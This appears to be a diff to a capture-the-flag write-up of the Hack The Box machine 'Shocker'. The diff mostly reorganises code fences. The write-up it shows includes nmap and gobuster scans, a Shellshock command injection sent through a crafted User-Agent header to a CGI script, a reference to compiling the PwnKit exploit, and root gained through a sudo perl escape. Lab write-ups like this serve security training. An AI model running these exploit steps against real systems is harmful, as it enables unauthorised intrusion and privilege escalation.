@@ -26,6 +26,9 @@ tags:
 
 ```bash
 ❯ nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.10.10.56
+```
+
+```php
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 09:40 CEST
 Initiating SYN Stealth Scan at 09:40
@@ -51,45 +54,9 @@ Nmap done: 1 IP address (1 host up) scanned in 26.79 seconds
 
 ```bash
 ❯ nmap -sCV -p2222 -vvv 10.10.10.56
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 09:41 CEST
-NSE: Loaded 157 scripts for scanning.
-NSE: Script Pre-scanning.
-NSE: Starting runlevel 1 (of 3) scan.
-Initiating NSE at 09:42
-Completed NSE at 09:42, 0.00s elapsed
-NSE: Starting runlevel 2 (of 3) scan.
-Initiating NSE at 09:42
-Completed NSE at 09:42, 0.00s elapsed
-NSE: Starting runlevel 3 (of 3) scan.
-Initiating NSE at 09:42
-Completed NSE at 09:42, 0.00s elapsed
-Initiating Ping Scan at 09:42
-Scanning 10.10.10.56 [4 ports]
-Completed Ping Scan at 09:42, 0.09s elapsed (1 total hosts)
-Initiating Parallel DNS resolution of 1 host. at 09:42
-Completed Parallel DNS resolution of 1 host. at 09:42, 0.03s elapsed
-DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
-Initiating SYN Stealth Scan at 09:42
-Scanning 10.10.10.56 [1 port]
-Discovered open port 2222/tcp on 10.10.10.56
-Completed SYN Stealth Scan at 09:42, 0.08s elapsed (1 total ports)
-Initiating Service scan at 09:42
-Scanning 1 service on 10.10.10.56
-Completed Service scan at 09:42, 0.13s elapsed (1 service on 1 host)
-NSE: Script scanning 10.10.10.56.
-NSE: Starting runlevel 1 (of 3) scan.
-Initiating NSE at 09:42
-Completed NSE at 09:42, 2.64s elapsed
-NSE: Starting runlevel 2 (of 3) scan.
-Initiating NSE at 09:42
-Completed NSE at 09:42, 0.00s elapsed
-NSE: Starting runlevel 3 (of 3) scan.
-Initiating NSE at 09:42
-Completed NSE at 09:42, 0.00s elapsed
-Nmap scan report for 10.10.10.56
-Host is up, received echo-reply ttl 63 (0.064s latency).
-Scanned at 2025-06-04 09:42:00 CEST for 3s
+```
 
+```php
 PORT     STATE SERVICE REASON         VERSION
 2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -121,6 +88,9 @@ Nmap done: 1 IP address (1 host up) scanned in 3.72 seconds
 
 ```bash
 ❯ gobuster dir -u http://10.10.10.56/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 --add-slash
+```
+
+```php
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -144,6 +114,9 @@ Starting gobuster in directory enumeration mode
 
 ```bash
 ❯ gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50  -x sh
+```
+
+```php
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -174,6 +147,9 @@ Starting gobuster in directory enumeration mode
 
 ```bash
 ❯ curl -s http://10.10.10.56/cgi-bin/user.sh -H "User-Agent: () { :; }; echo; /usr/bin/whoami"
+```
+
+```php
 shelly
 ```
 
@@ -193,7 +169,9 @@ shelly
 
 ```bash
 shelly@Shocker:/tmp$ find / -perm -4000 2>/dev/null
+```
 
+```php
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
 /usr/lib/openssh/ssh-keysign
@@ -238,7 +216,9 @@ gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
 
 ```bash
 shelly@Shocker:/tmp$ sudo -l
+```
 
+```php
 Matching Defaults entries for shelly on Shocker:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
@@ -250,7 +230,9 @@ User shelly may run the following commands on Shocker:
 
 ```bash
 shelly@Shocker:/tmp$ sudo perl -e 'exec "/bin/bash";'  
+```
 
+```php
 root@Shocker:/tmp# 
 ```
 
